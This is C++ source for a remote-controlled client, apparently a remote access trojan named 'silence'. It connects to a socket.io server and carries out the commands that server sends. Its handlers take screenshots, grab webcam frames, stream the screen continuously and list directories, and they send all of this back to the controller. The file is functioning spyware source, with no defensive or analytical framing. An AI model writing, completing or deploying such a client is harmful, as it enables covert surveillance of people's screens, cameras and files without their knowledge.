#include <Client.h>

#define SIOSTR(str) sio::string_message::create(str)

namespace silence
{
    Client::Client(const std::string &url)
        : mUrl(url), mIO(new sio::client())
    {
        using namespace std::placeholders;
        mSocket = mIO->socket();

        // bind events
        mSocket->on("command", std::bind(&Client::onCommand,
                                         this, _1, _2, _3, _4));

        mIO->set_socket_open_listener(std::bind(&Client::onConnected, this, _1));
        mIO->set_close_listener(std::bind(&Client::onClosed, this, _1));
        mIO->set_fail_listener(std::bind(&Client::onFailed, this));
    }

    Client::~Client()
    {
        mSocket->off_all();
        mSocket->off_error();

        mLock.lock();
        mCond.notify_all();
        mLock.unlock();
    }

    void Client::connect()
    {
        mIO->connect(mUrl);
        mLock.lock();
        mCond.wait(mLock);
        mLock.unlock();
    }

    void Client::onConnected(const std::string &nsp)
    {
        std::cout << "Connected with server on nsp: " << nsp << std::endl;
    }

    void Client::onFailed()
    {
        std::cout << "sio failed" << std::endl;
    }

    void Client::onClosed(sio::client::close_reason const &reason)
    {
        std::cout << reason << std::endl;
        std::cout << "sio closed" << std::endl;
    }

    sio::message::list
    Client::createObject(const CommandObject &object)
    {
        auto obj = sio::object_message::create();
        obj.get()->get_map() = object;
        return obj;
    }

    template <typename T, typename... Args>
    void Client::launchEvent(const std::function<T> &callable,
                             Args &&...args)
    {
        std::thread thread{callable, args...};
        thread.detach();
    }

    void Client::onCommand(std::string const &name,
                           sio::message::ptr const &data,
                           bool hasAck,
                           sio::message::list &ack_resp)
    {
        using namespace std::placeholders;
        auto commandObject = data->get_map();
        std::string event = commandObject["event"]->get_string();

        if (event == "greet")
            launchEvent<void()>(std::bind(&Client::greetEvent, this));
        else if (event == "start stream")
            launchEvent<void()>(std::bind(&Client::startStreamEvent, this));
        else if (event == "kill stream")
            launchEvent<void()>(std::bind(&Client::killStreamEvent, this));
        else if (event == "screenshot")
            launchEvent<void()>(std::bind(&Client::screenshotEvent, this));
        else if (event == "webcamshot")
            launchEvent<void()>(std::bind(&Client::webcamShotEvent, this));
        else if (event == "listdir")
            launchEvent<void(const CommandObject &)>(
                std::bind(&Client::listDirEvent, this, _1), commandObject);
        else
            error(event, "Unknown event");
    }

    void Client::greetEvent()
    {
        mSocket->emit("add client",
                      createObject({{"hostname", SIOSTR("hostname")},
                                    {"username", SIOSTR("username")}}));
    }

    void Client::screenshotEvent()
    {
        impl::Screenshot screen;
        cv::Mat image{screen.take()};

        mSocket->emit("screenshot",
                      impl::toBinaryString(image));
    }

    void Client::webcamShotEvent()
    {
        try
        {
            cv::VideoCapture camera;
            cv::Mat image;

            camera.read(image);
            mSocket->emit("webcamshot", impl::toBinaryString(image));
        }
        catch (cv::Exception &)
        {
            error("webcamshot", "No camera found!");
        }
    }

    void Client::killStreamEvent()
    {
        std::unique_lock<std::mutex> lockGuard(mStreamLocker);

        if (!mStreamRunning)
        {
            error("kill stream", "Stream is already killed");
            return;
        }

        mStreamRunning = false;
        info("Successfully killed stream");
    }

    void Client::startStreamEvent()
    {
        std::unique_lock<std::mutex> lockGuard(mStreamLocker);
        mStreamRunning = true;
        lockGuard.unlock();

        impl::Screenshot screen;
        while (true)
        {
            lockGuard.lock();
            if (!mStreamRunning)
                return;
            lockGuard.unlock();

            cv::Mat image{screen.take()};
            mSocket->emit("frame",
                          impl::toBinaryString(image));
        }
    }

    void Client::listDirEvent(const CommandObject &object)
    {
        auto dirList = sio::array_message::create();
        for (const auto &entry : fs::directory_iterator(object.at("path")->get_string()))
            dirList->get_vector().push_back(sio::string_message::create(entry.path()));

        mSocket->emit("directory", dirList);
    }

    void Client::error(const std::string &event, const std::string &msg)
    {
        mSocket->emit("error", createObject({{"event", SIOSTR(event)},
                                             {"msg", SIOSTR(msg)}}));
    }

    void Client::info(const std::string &info)
    {
        mSocket->emit("info", createObject({{"msg", SIOSTR(info)}}));
    }
}